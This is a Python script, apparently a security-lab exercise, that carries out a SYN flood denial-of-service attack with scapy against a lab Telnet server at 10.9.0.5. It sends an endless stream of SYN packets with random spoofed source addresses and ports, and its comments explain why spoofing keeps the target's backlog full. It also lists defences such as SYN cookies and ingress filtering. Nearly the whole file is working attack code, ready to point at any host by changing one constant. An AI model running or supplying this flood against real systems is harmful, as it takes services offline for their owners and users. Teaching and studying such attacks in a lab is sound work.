#!/usr/bin/env python3
"""
Lab 6 — TCP Attacks
Task: SYN Flood DoS attack
Description:
    Sends a continuous stream of TCP SYN packets to port 23 (Telnet) on the
    target host, each with a different random spoofed source IP and random
    source port.  The target allocates a Transmission Control Block (TCB)
    for each SYN and enters the SYN_RECV state, waiting for an ACK that
    never comes.  Once the backlog queue is full, new legitimate connections
    are refused — a Denial of Service.

    Must be run as root:
        sudo python3 syn_flood.py
"""

import random
from scapy.all import IP, TCP, send

# =============================================================================
# Target configuration
# =============================================================================

TARGET_IP   = "10.9.0.5"   # Victim host IP (Telnet server in the lab)
TARGET_PORT = 23            # Telnet port

# =============================================================================
# Why spoofed source IPs are used
# =============================================================================
# 1. TCB exhaustion requires that the SYN_RECV entries are NEVER completed.
#    If we used our real IP, the target would send SYN-ACK back to us and
#    our OS kernel would automatically send RST (since we didn't open the
#    connection), clearing the TCB.  Spoofed IPs ensure no RST arrives.
#
# 2. Spoofed IPs make each SYN appear to come from a different host, so the
#    server cannot rate-limit by source IP.
#
# 3. SYN_RECV entries expire (typically after 75 seconds), but we send faster
#    than they expire, keeping the backlog permanently full.
#
# Mitigations:
#   - SYN cookies: server encodes state in the ISN so no TCB is allocated
#     until the ACK arrives (no backlog consumed).
#   - Ingress filtering (BCP 38): routers drop packets with spoofed source IPs.
#   - Increasing the SYN backlog: sysctl -w net.ipv4.tcp_max_syn_backlog=...

# =============================================================================
# SYN flood loop
# =============================================================================

print(f"[*] Starting SYN flood on {TARGET_IP}:{TARGET_PORT} ...")
print(f"[*] Press Ctrl+C to stop.\n")

while True:
    # Randomise source IP — one of 2^32 possible addresses (avoid 0.x and 255.x)
    rand_src_ip = (
        f"{random.randint(1, 254)}."
        f"{random.randint(0, 255)}."
        f"{random.randint(0, 255)}."
        f"{random.randint(1, 254)}"
    )

    # Randomise source port (ephemeral range 1024–65535)
    rand_sport = random.randint(1024, 65535)

    # Random initial sequence number (32-bit)
    rand_seq = random.randint(0, 0xFFFFFFFF)

    # Build the IP layer (spoofed source)
    ip = IP(
        src=rand_src_ip,   # Spoofed — reply SYN-ACK goes here and is ignored
        dst=TARGET_IP,
    )

    # Build the TCP SYN segment
    tcp = TCP(
        sport=rand_sport,  # Random source port so each TCB looks unique
        dport=TARGET_PORT, # Telnet port on the target
        flags="S",         # S = SYN — initiates a TCP handshake
        seq=rand_seq,      # Random ISN; target will set ACK = ISN+1 in SYN-ACK
    )

    # send() uses Layer 3 (raw socket); OS fills in the Ethernet header
    send(ip / tcp, verbose=False)  # verbose=False suppresses per-packet output
